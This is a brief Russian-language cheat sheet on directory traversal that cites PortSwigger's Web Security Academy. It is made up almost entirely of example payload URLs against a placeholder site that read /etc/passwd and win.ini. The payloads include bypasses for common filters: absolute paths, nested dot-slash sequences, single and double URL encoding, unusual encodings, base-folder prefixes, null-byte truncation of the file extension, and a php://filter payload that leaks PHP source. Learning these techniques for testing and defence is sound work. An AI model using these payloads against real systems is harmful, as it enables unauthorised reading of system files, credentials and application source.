[Directory traversal](https://portswigger.net/web-security/file-path-traversal)

## Чтение произвольных файлов через обход каталога
Unix-based:
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`
Windows:
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
## Общие препятствия для использования уязвимостей обхода путей к файлам
Использование абсолютной пути:
`https://insecure-website.com/loadImage?filename=/etc/passwd`
Использование вложенных последовательностей, например, ....// или ....\\/:
`https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
Обход путем кодирования URL:
`../ == %2e%2e%2f`
или двойного кодирования URL:
`../ == %252e%252e%252f`
Различные нестандартные кодировки, такие как `..%c0%af` или `..%ef%bc%8f`, также могут сработать.
Если приложение требует, чтобы имя файла, начиналось с ожидаемой базовой папки, например, `/var/www/images`, то можно включить требуемую базовую папку, за которой следуют подходящие последовательности:
`https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
Если приложение требует, чтобы имя файла, предоставляемое пользователем, заканчивалось ожидаемым расширением файла, например `.png`, то можно использовать нулевой байт (`%00`), чтобы обрезать путь к файлу перед требуемым расширением:
`https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`

`image.php?img=php://filter/convert.base64-encode/resource=index.php`

